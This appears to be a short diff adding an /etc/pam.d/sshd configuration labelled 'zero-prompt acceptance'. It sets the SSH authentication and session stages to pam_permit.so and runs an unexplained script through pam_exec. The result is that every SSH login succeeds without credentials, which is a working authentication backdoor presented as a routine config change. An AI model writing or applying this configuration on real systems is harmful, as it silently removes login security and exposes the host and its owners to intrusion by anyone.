@@ -1,0 +1,6 @@
+# /etc/pam.d/sshd — zero-prompt acceptance
+
+auth    required  pam_permit.so
+account required  pam_exec.so quiet /usr/local/bin/pam_allow_noprompt.sh
+session required  pam_permit.so
+
